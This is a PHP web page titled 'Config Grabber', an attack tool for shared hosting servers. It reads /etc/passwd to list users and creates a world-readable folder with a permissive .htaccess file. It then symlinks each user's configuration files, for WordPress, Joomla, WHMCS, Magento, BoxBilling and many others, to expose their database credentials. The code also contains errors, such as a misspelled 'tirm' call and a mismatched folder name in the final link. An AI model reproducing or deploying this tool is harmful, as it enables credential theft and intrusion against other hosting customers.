// Please Don't Change Copyright
<!DOCTYPE html>
<html>
<head>
	<title>Config Grabber</title>
</head>
<style>
	body{
		background-color: black;
	}
</style>
<body>
	<center>
	<img height="200" width="200" src="http://www12.0zz0.com/2014/12/28/03/895190770.jpg">
	<p style="color:red;font-weight: bolder;font-size: 20px">Config Grabber</p>
	<p style="color:red;">[ C0ded By Red Virus ]</p>
	<form method="post">
		<input name="get" type="submit" value="Click Here To Get Users"><br/>

	</form>
	<?php
		if(@$_POST['get']){
			?>
			<br/>
			<textarea name="list" style="background-color: black;color:white;" rows="30" cols="35"><?php $file = @file('/etc/passwd');
			foreach ($file as $user) {
				$str = explode(":", $user);
				echo $str[0] . "\n";
			}


			?>
			</textarea>
			<form method="post">
				<input type="submit" value="Config Grabber" name="config">
			</form>
		<?php } ?>
		<?php
		if(@$_POST['config']){
			if(@file_exists("RV_Config")){
				echo "<br/>";
				echo "<a href='RV_Config'>Configuration Files</a>";
			}else{
				$dir = mkdir("RV_Config",0777);
			    $r = " Options all \n DirectoryIndex RV_Config.html \n Require None \n Satisfy Any";
          		$f = fopen('RV_Config/.htaccess','w');
          		fwrite($f, $r);
          		$usr = explode("\n", $_POST['list']);
          		foreach($usr as $uss){
          			$us = tirm($uss);
          			$r = "RV_Config/";
       symlink('/home/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
      symlink('/home/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
      symlink('/home/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
      symlink('/home/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
      symlink('/home/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
      symlink('/home/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
      symlink('/home/'.$us.'/public_html/includes/config.php',$r.$us.'..vb');
      symlink('/home/'.$us.'/public_html/conf_global.php',$r.$us.'..conf_global');
      symlink('/home/'.$us.'/public_html/inc/config.php',$r.$us.'..inc');
      symlink('/home/'.$us.'/public_html/config.php',$r.$us.'..config');
      symlink('/home/'.$us.'/public_html/Settings.php',$r.$us.'..Settings');
      symlink('/home/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..sites');
      symlink('/home/'.$us.'/public_html/whm/configuration.php',$r.$us.'..whm');
      symlink('/home/'.$us.'/public_html/whmcs/configuration.php',$r.$us.'..whmcs');
      symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..supporwhmcs');
      symlink('/home/'.$us.'/public_html/whmc/WHM/configuration.php',$r.$us.'..WHM');
      symlink('/home/'.$us.'/public_html/whm/WHMCS/configuration.php',$r.$us.'..whmc');
      symlink('/home/'.$us.'/public_html/whm/whmcs/configuration.php',$r.$us.'..WHMcs');
      symlink('/home/'.$us.'/public_html/support/configuration.php',$r.$us.'..whmcsupp');
      symlink('/home/'.$us.'/public_html/clients/configuration.php',$r.$us.'..whmcs-cli');
      symlink('/home/'.$us.'/public_html/client/configuration.php',$r.$us.'..whmcs-cl');
      symlink('/home/'.$us.'/public_html/clientes/configuration.php',$r.$us.'..whmcs-CL');
      symlink('/home/'.$us.'/public_html/cliente/configuration.php',$r.$us.'..whmcs-Cl');
      symlink('/home/'.$us.'/public_html/clientsupport/configuration.php',$r.$us.'..whmcs-csup');
      symlink('/home/'.$us.'/public_html/billing/configuration.php',$r.$us.'..whmcs-bill');
      symlink('/home/'.$us.'/public_html/admin/config.php',$r.$us.'..admin-conf');
      symlink('/home/'.$us.'/public_html/config/koneksi.php',$r.$us.'..Lokomedia');
      symlink('/home/'.$us.'/public_html/forum/config.php',$r .$us.'..phpBB');
      symlink('/home/'.$us.'/public_html/sites/default/settings.php',$r.$us.'..Drupal');
      symlink('/home/'.$us.'/public_html/config/settings.inc.php',$r.$us.'..PrestaShop');
      symlink('/home/'.$us.'/public_html/app/etc/local.xml',$r.$us.'..Magento');
      symlink('/home/'.$us.'/public_html/application/config/database.php',$r.$us.'..Ellislab');
      symlink('/home/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..Vbulletin');
      symlink('/home/'.$us.'/public_html/includes/config.php',$r.$us.'..Vbulletin');
      symlink('/home/'.$us.'/public_html/forum/includes/config.php',$r.$us.'..Vbulletin');
      symlink('/home/'.$us.'/public_html/forums/includes/config.php',$r.$us.'..Vbulletin');
      symlink('/home/'.$us.'/public_html/cc/includes/config.php',$r.$us.'..Vbulletin');
      symlink('/home/'.$us.'/public_html/inc/config.php',$r.$us.'..MyBB');
      symlink('/home/'.$us.'/public_html/includes/configure.php',$r.$us.'..OsCommerce');
      symlink('/home/'.$us.'/public_html/shop/includes/configure.php',$r.$us.'..OsCommerce');
      symlink('/home/'.$us.'/public_html/os/includes/configure.php',$r.$us.'..OsCommerce');
      symlink('/home/'.$us.'/public_html/oscom/includes/configure.php',$r.$us.'..OsCommerce');
      symlink('/home/'.$us.'/public_html/products/includes/configure.php',$r.$us.'..OsCommerce');
      symlink('/home/'.$us.'/public_html/cart/includes/configure.php',$r.$us.'..OsCommerce');
      symlink('/home/'.$us.'/public_html/inc/conf_global.php',$r.$us.'..IPB');
      symlink('/home/'.$us.'/public_html/wp-config.php',$r.$us.'..Wordpress');
      symlink('/home/'.$us.'/public_html/wp/test/wp-config.php',$r.$us.'..Wordpress');
      symlink('/home/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..Wordpress');
      symlink('/home/'.$us.'/public_html/beta/wp-config.php',$r.$us.'..Wordpress');
      symlink('/home/'.$us.'/public_html/portal/wp-config.php',$r.$us.'..Wordpress');
      symlink('/home/'.$us.'/public_html/site/wp-config.php',$r.$us.'..Wordpress');
      symlink('/home/'.$us.'/public_html/wp/wp-config.php',$r.$us.'..Wordpress');
      symlink('/home/'.$us.'/public_html/WP/wp-config.php',$r.$us.'..Wordpress');
      symlink('/home/'.$us.'/public_html/news/wp-config.php',$r.$us.'..Wordpress');
      symlink('/home/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..Wordpress');
      symlink('/home/'.$us.'/public_html/test/wp-config.php',$r.$us.'..Wordpress');
      symlink('/home/'.$us.'/public_html/demo/wp-config.php',$r.$us.'..Wordpress');
      symlink('/home/'.$us.'/public_html/home/wp-config.php',$r.$us.'..Wordpress');
      symlink('/home/'.$us.'/public_html/v1/wp-config.php',$r.$us.'..Wordpress');
      symlink('/home/'.$us.'/public_html/v2/wp-config.php',$r.$us.'..Wordpress');
      symlink('/home/'.$us.'/public_html/press/wp-config.php',$r.$us.'..Wordpress');
      symlink('/home/'.$us.'/public_html/new/wp-config.php',$r.$us.'..Wordpress');
      symlink('/home/'.$us.'/public_html/blogs/wp-config.php',$r.$us.'..Wordpress');
      symlink('/home/'.$us.'/public_html/configuration.php',$r.$us.'..Joomla');
      symlink('/home/'.$us.'/public_html/blog/configuration.php',$r.$us.'..Joomla');
      symlink('/home/'.$us.'/public_html/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/cms/configuration.php',$r.$us.'..Joomla');
      symlink('/home/'.$us.'/public_html/beta/configuration.php',$r.$us.'..Joomla');
      symlink('/home/'.$us.'/public_html/portal/configuration.php',$r.$us.'..Joomla');
      symlink('/home/'.$us.'/public_html/site/configuration.php',$r.$us.'..Joomla');
      symlink('/home/'.$us.'/public_html/main/configuration.php',$r.$us.'..Joomla');
      symlink('/home/'.$us.'/public_html/home/configuration.php',$r.$us.'..Joomla');
      symlink('/home/'.$us.'/public_html/demo/configuration.php',$r.$us.'..Joomla');
      symlink('/home/'.$us.'/public_html/test/configuration.php',$r.$us.'..Joomla');
      symlink('/home/'.$us.'/public_html/v1/configuration.php',$r.$us.'..Joomla');
      symlink('/home/'.$us.'/public_html/v2/configuration.php',$r.$us.'..Joomla');
      symlink('/home/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..Joomla');
      symlink('/home/'.$us.'/public_html/new/configuration.php',$r.$us.'..Joomla');
      symlink('/home/'.$us.'/public_html/WHMCS/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/whmcs1/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Whmcs/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/whmcs/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/whmcs/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/WHMC/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Whmc/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/whmc/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/WHM/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Whm/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/whm/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/HOST/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Host/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/host/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/SUPPORTES/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Supportes/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/supportes/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/domains/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/domain/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Hosting/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/HOSTING/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/hosting/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/CART/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Cart/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/cart/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/ORDER/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Order/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/order/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/CLIENT/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Client/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/client/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/CLIENTAREA/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Clientarea/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/clientarea/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/SUPPORT/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Support/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/support/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/BILLING/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Billing/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/billing/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/BUY/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Buy/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/buy/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/MANAGE/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Manage/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/manage/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/CLIENTSUPPORT/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/ClientSupport/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Clientsupport/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/clientsupport/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/CHECKOUT/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Checkout/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/checkout/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/BILLINGS/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Billings/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/billings/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/BASKET/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Basket/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/basket/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/SECURE/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Secure/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/secure/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/SALES/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Sales/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/sales/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/BILL/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Bill/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/bill/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/PURCHASE/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Purchase/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/purchase/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/ACCOUNT/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Account/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/account/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/USER/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/User/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/user/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/CLIENTS/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Clients/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/clients/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/BILLINGS/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/Billings/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/billings/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/MY/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/My/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/my/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/secure/whm/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/secure/whmcs/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/panel/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/clientes/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/cliente/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/support/order/submitticket.php',$r.$us.'..WHMCS');
      symlink('/home/'.$us.'/public_html/bb-config.php',$r.$us.'..BoxBilling');
      symlink('/home/'.$us.'/public_html/boxbilling/bb-config.php',$r.$us.'..BoxBilling');
      symlink('/home/'.$us.'/public_html/box/bb-config.php',$r.$us.'..BoxBilling');
      symlink('/home/'.$us.'/public_html/host/bb-config.php',$r.$us.'..BoxBilling');
      symlink('/home/'.$us.'/public_html/Host/bb-config.php',$r.$us.'..BoxBilling');
      symlink('/home/'.$us.'/public_html/supportes/bb-config.php',$r.$us.'..BoxBilling');
      symlink('/home/'.$us.'/public_html/support/bb-config.php',$r.$us.'..BoxBilling');
      symlink('/home/'.$us.'/public_html/hosting/bb-config.php',$r.$us.'..BoxBilling');
      symlink('/home/'.$us.'/public_html/cart/bb-config.php',$r.$us.'..BoxBilling');
      symlink('/home/'.$us.'/public_html/order/bb-config.php',$r.$us.'..BoxBilling');
      symlink('/home/'.$us.'/public_html/client/bb-config.php',$r.$us.'..BoxBilling');
      symlink('/home/'.$us.'/public_html/clients/bb-config.php',$r.$us.'..BoxBilling');
      symlink('/home/'.$us.'/public_html/cliente/bb-config.php',$r.$us.'..BoxBilling');
      symlink('/home/'.$us.'/public_html/clientes/bb-config.php',$r.$us.'..BoxBilling');
      symlink('/home/'.$us.'/public_html/billing/bb-config.php',$r.$us.'..BoxBilling');
      symlink('/home/'.$us.'/public_html/billings/bb-config.php',$r.$us.'..BoxBilling');
      symlink('/home/'.$us.'/public_html/my/bb-config.php',$r.$us.'..BoxBilling');
      symlink('/home/'.$us.'/public_html/secure/bb-config.php',$r.$us.'..BoxBilling');
      symlink('/home/'.$us.'/public_html/order/bb-config.php',$r.$us.'..BoxBilling');
      symlink('/home/'.$us.'/public_html/includes/dist-configure.php',$r.$us.'..Zencart');
      symlink('/home/'.$us.'/public_html/zencart/includes/dist-configure.php',$r.$us.'..Zencart');
      symlink('/home/'.$us.'/public_html/products/includes/dist-configure.php',$r.$us.'..Zencart');
      symlink('/home/'.$us.'/public_html/cart/includes/dist-configure.php',$r.$us.'..Zencart');
      symlink('/home/'.$us.'/public_html/shop/includes/dist-configure.php',$r.$us.'..Zencart');
      symlink('/home/'.$us.'/public_html/hostbills/includes/iso4217.php',$r.$us.'..Hostbills');
      symlink('/home/'.$us.'/public_html/host/includes/iso4217.php',$r.$us.'..Hostbills');
      symlink('/home/'.$us.'/public_html/Host/includes/iso4217.php',$r.$us.'..Hostbills');
      symlink('/home/'.$us.'/public_html/supportes/includes/iso4217.php',$r.$us.'..Hostbills');
      symlink('/home/'.$us.'/public_html/support/includes/iso4217.php',$r.$us.'..Hostbills');
      symlink('/home/'.$us.'/public_html/hosting/includes/iso4217.php',$r.$us.'..Hostbills');
      symlink('/home/'.$us.'/public_html/cart/includes/iso4217.php',$r.$us.'..Hostbills');
      symlink('/home/'.$us.'/public_html/order/includes/iso4217.php',$r.$us.'..Hostbills');
      symlink('/home/'.$us.'/public_html/client/includes/iso4217.php',$r.$us.'..Hostbills');
      symlink('/home/'.$us.'/public_html/clients/includes/iso4217.php',$r.$us.'..Hostbills');
      symlink('/home/'.$us.'/public_html/cliente/includes/iso4217.php',$r.$us.'..Hostbills');
      symlink('/home/'.$us.'/public_html/clientes/includes/iso4217.php',$r.$us.'..Hostbills');
      symlink('/home/'.$us.'/public_html/billing/includes/iso4217.php',$r.$us.'..Hostbills');
      symlink('/home/'.$us.'/public_html/my/includes/iso4217.php',$r.$us.'..Hostbills');
      symlink('/home/'.$us.'/public_html/secure/includes/iso4217.php',$r.$us.'..Hostbills');
      symlink('/home/'.$us.'/public_html/support/order/includes/iso4217.php',$r.$us.'..Hostbills');
                }
              echo "<br/>";
              echo "<a href='Navir_Config' class='echo5' style='color:red'>Configuration Files</a>";
              
      
              }
            }
?>
	
	</center>
</body>
</html>
